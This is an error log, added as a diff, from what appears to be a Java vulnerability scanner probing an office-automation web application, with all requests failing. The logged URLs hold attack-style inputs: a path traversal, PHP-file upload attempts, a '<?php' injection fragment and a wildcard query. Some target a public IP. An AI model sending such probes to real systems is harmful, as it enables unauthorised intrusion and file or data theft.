+2024-09-18 14:12:33  [ Thread-3:10336 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/document/index.php/recv/register/insert发生错误:java.io.FileNotFoundException: https://127.0.0.1/general/document/index.php/recv/register/insert , retrying...3
+2024-09-18 14:12:34  [ Thread-3:11349 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 14:12:34  [ Thread-3:11617 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/module/appbuilder/assets/print.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/module/appbuilder/assets/print.php , retrying...1
+2024-09-18 14:12:35  [ Thread-3:12863 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/module/appbuilder/assets/print.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/module/appbuilder/assets/print.php , retrying...2
+2024-09-18 14:12:36  [ Thread-3:14094 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/module/appbuilder/assets/print.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/module/appbuilder/assets/print.php , retrying...3
+2024-09-18 14:12:37  [ Thread-3:15098 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 14:12:40  [ Thread-3:17305 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/mobile/api/api.ali.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/mobile/api/api.ali.php , retrying...1
+2024-09-18 14:12:41  [ Thread-3:18547 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/mobile/api/api.ali.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/mobile/api/api.ali.php , retrying...2
+2024-09-18 14:12:42  [ Thread-3:19790 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/mobile/api/api.ali.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/mobile/api/api.ali.php , retrying...3
+2024-09-18 14:12:43  [ Thread-3:20801 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 14:12:43  [ Thread-3:21041 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/d1a4278d?json={}&aa=<?php发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 14:12:45  [ Thread-3:22282 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/d1a4278d?json={}&aa=<?php发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 14:12:46  [ Thread-3:23519 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/d1a4278d?json={}&aa=<?php发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 14:12:47  [ Thread-3:24531 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 14:12:51  [ Thread-3:28395 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/appbuilder/web/portal/gateway/moare?a=1发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 14:12:52  [ Thread-3:29893 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/appbuilder/web/portal/gateway/moare?a=1发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 14:12:54  [ Thread-3:31728 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/appbuilder/web/portal/gateway/moare?a=1发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 14:12:55  [ Thread-3:32732 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 14:12:57  [ Thread-3:34457 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/api/1.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/api/1.php , retrying...1
+2024-09-18 14:12:59  [ Thread-3:37006 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/api/1.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/api/1.php , retrying...2
+2024-09-18 14:13:02  [ Thread-3:39537 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/api/1.php发生错误:java.io.FileNotFoundException: https://127.0.0.1/api/1.php , retrying...3
+2024-09-18 14:13:03  [ Thread-3:40538 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 14:13:03  [ Thread-3:40765 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/vmeet/wbUpload.php?fileName=test1.php+发生错误:java.io.FileNotFoundException: https://127.0.0.1/general/vmeet/wbUpload.php?fileName=test1.php+ , retrying...1
+2024-09-18 14:13:04  [ Thread-3:41993 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/vmeet/wbUpload.php?fileName=test1.php+发生错误:java.io.FileNotFoundException: https://127.0.0.1/general/vmeet/wbUpload.php?fileName=test1.php+ , retrying...2
+2024-09-18 14:13:06  [ Thread-3:43221 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/vmeet/wbUpload.php?fileName=test1.php+发生错误:java.io.FileNotFoundException: https://127.0.0.1/general/vmeet/wbUpload.php?fileName=test1.php+ , retrying...3
+2024-09-18 14:13:07  [ Thread-3:44222 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 14:13:07  [ Thread-3:44449 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/vmeet/privateUpload.php?fileName=test1.php+发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 14:13:08  [ Thread-3:45679 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/vmeet/privateUpload.php?fileName=test1.php+发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 14:13:09  [ Thread-3:46913 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/vmeet/privateUpload.php?fileName=test1.php+发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 14:13:10  [ Thread-3:47914 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 14:13:12  [ Thread-3:49645 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/inc/package/down.php?id=../../../cache/org发生错误:java.lang.NullPointerException , retrying...1
+2024-09-18 14:13:13  [ Thread-3:50936 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/inc/package/down.php?id=../../../cache/org发生错误:java.lang.NullPointerException , retrying...2
+2024-09-18 14:13:15  [ Thread-3:52260 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/inc/package/down.php?id=../../../cache/org发生错误:java.lang.NullPointerException , retrying...3
+2024-09-18 14:13:16  [ Thread-3:53261 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-18 14:13:16  [ Thread-3:53375 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-20 11:38:48  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...1
+2024-09-20 11:38:49  [ Thread-3:1337 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...2
+2024-09-20 11:38:50  [ Thread-3:2617 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...3
+2024-09-20 11:38:51  [ Thread-3:3617 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-20 11:39:34  [ Thread-4:45860 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...1
+2024-09-20 11:39:35  [ Thread-4:47188 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...2
+2024-09-20 11:39:36  [ Thread-4:48475 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...3
+2024-09-20 11:39:37  [ Thread-4:49475 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-20 11:41:16  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...1
+2024-09-20 11:41:17  [ Thread-3:1295 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...2
+2024-09-20 11:41:18  [ Thread-3:2587 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...3
+2024-09-20 11:41:19  [ Thread-3:3589 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-20 11:41:38  [ Thread-4:22304 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-20 11:41:41  [ Thread-4:25550 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-20 11:41:44  [ Thread-4:28786 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-20 11:41:45  [ Thread-4:29787 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-20 11:44:18  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...1
+2024-09-20 11:44:19  [ Thread-3:1295 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...2
+2024-09-20 11:44:20  [ Thread-3:2587 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...3
+2024-09-20 11:44:21  [ Thread-3:3589 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-20 11:46:33  [ Thread-4:135966 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...1
+2024-09-20 11:46:35  [ Thread-4:137274 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...2
+2024-09-20 11:46:36  [ Thread-4:138575 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...3
+2024-09-20 11:46:37  [ Thread-4:139581 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-20 11:49:37  [ Thread-5:319727 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://121.199.2.183:89/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3发生错误:java.lang.NullPointerException , retrying...1
+2024-09-20 15:11:30  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.util.regex.PatternSyntaxException: Illegal repetition near index 10
+"codeuid":"{[a-zA-Z0-9-\-]+}"
+          ^ , retrying...1
+2024-09-20 15:11:31  [ Thread-3:1705 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.util.regex.PatternSyntaxException: Illegal repetition near index 10
+"codeuid":"{[a-zA-Z0-9-\-]+}"
+          ^ , retrying...2
+2024-09-20 15:11:33  [ Thread-3:3398 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.util.regex.PatternSyntaxException: Illegal repetition near index 10
+"codeuid":"{[a-zA-Z0-9-\-]+}"
+          ^ , retrying...3
+2024-09-20 15:11:34  [ Thread-3:4399 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-20 16:39:19  [ Thread-4:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...1
+2024-09-20 16:39:30  [ Thread-4:11219 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...2
+2024-09-20 16:39:32  [ Thread-4:12429 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-20 16:55:32  [ Thread-3:3 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-20 16:55:53  [ Thread-4:20932 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...1
+2024-09-20 16:56:04  [ Thread-4:32146 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...2
+2024-09-20 16:56:13  [ Thread-4:41004 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-20 17:03:34  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...1
+2024-09-20 17:03:45  [ Thread-3:11207 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...2
+2024-09-20 17:03:56  [ Thread-3:22414 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...3
+2024-09-20 17:03:57  [ Thread-3:23415 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-20 17:05:51  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...1
+2024-09-20 17:06:03  [ Thread-3:11208 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...2
+2024-09-20 17:06:14  [ Thread-3:22412 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...3
+2024-09-20 17:06:15  [ Thread-3:23414 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-20 17:09:00  [ Thread-4:1 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...1
+2024-09-20 17:09:11  [ Thread-4:11210 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...2
+2024-09-20 17:09:22  [ Thread-4:22413 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...3
+2024-09-20 17:09:23  [ Thread-4:23414 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-23 09:27:18  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...1
+2024-09-23 09:27:39  [ Thread-3:21286 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...2
+2024-09-23 09:28:01  [ Thread-3:42578 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://127.0.0.1/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...3
+2024-09-23 09:28:02  [ Thread-3:43589 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-23 09:40:02  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...1
+2024-09-23 09:40:13  [ Thread-3:11208 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...2
+2024-09-23 09:40:25  [ Thread-3:22412 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...3
+2024-09-23 09:40:26  [ Thread-3:23412 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-23 10:04:26  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://172.29.3.61/general/file_folder/swfupload_new.php发生错误:java.net.SocketTimeoutException: Read timed out , retrying...1
+2024-09-23 11:09:23  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1/general/document/index.php/recv/register/insert发生错误:java.io.FileNotFoundException: http://127.0.0.1/general/document/index.php/recv/register/insert , retrying...1
+2024-09-23 11:09:24  [ Thread-3:1207 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1/general/document/index.php/recv/register/insert发生错误:java.io.FileNotFoundException: http://127.0.0.1/general/document/index.php/recv/register/insert , retrying...2
+2024-09-23 11:09:26  [ Thread-3:2415 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1/general/document/index.php/recv/register/insert发生错误:java.io.FileNotFoundException: http://127.0.0.1/general/document/index.php/recv/register/insert , retrying...3
+2024-09-23 11:09:27  [ Thread-3:3416 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
